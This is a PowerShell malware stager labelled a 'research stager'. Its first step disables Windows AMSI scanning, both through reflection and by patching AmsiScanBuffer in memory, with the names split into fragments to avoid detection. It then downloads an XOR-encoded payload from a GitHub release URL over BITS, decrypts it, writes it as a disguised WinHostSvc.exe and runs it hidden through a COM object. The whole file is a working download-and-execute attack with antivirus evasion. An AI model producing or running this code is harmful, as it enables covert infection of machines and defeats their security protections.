# --- [TIER 1 RESEARCH STAGER: XOR + AMSI PATCH] ---

function Patch-Mem {
    # This patches AmsiScanBuffer to prevent the system from scanning memory buffers
    try {
        $a = [Ref].Assembly.GetType('System.Management.Automation.A' + 'msi' + 'Utils')
        $b = $a.GetField('am' + 'si' + 'In' + 'it' + 'Fa' + 'il' + 'ed','NonPublic,Static')
        $b.SetValue($null,$true)
        
        # Advanced Byte-level Patch
        $w = Add-Type -PassThru -Name "w32" -Namespace "w32" -MemberDefinition @'
            [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
            [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@
        $h = $w::GetModuleHandle("am" + "si.dll")
        $ptr = $w::GetProcAddress($h, "Am" + "siS" + "canB" + "uffer")
        $old = 0
        $w::VirtualProtect($ptr, [UIntPtr]5, 0x40, [ref]$old)
        [Byte[]]$patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 6)
    } catch { }
}

# 1. Blind the AV locally
Patch-Mem

# 2. Define URLs and Paths
$url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
$key = 0xAB # Ensure this matches the key you used to encrypt
$workDir = "$env:LOCALAPPDATA\Microsoft\Windows\Caches"
$finalExe = "$workDir\WinHostSvc.exe"

if (!(Test-Path $workDir)) { New-Item -Path $workDir -ItemType Directory -Force | Out-Null }

try {
    # 3. Download the XOR string via BITS (Stealthy)
    $tmp = "$env:TEMP\data.tmp"
    Start-BitsTransfer -Source $url -Destination $tmp -Priority High
    
    # 4. Decode Base64 and XOR Decrypt
    $b64 = Get-Content $tmp -Raw
    $data = [Convert]::FromBase64String($b64.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor $key }
    
    # 5. Write Decrypted EXE to disk
    [IO.File]::WriteAllBytes($finalExe, $data)
    Remove-Item $tmp -Force

    # 6. Execute via COM (Detaches process from PowerShell)
    $s = New-Object -ComObject "Shell.Application"
    $s.ShellExecute($finalExe, "", "", "open", 0)
} catch { }
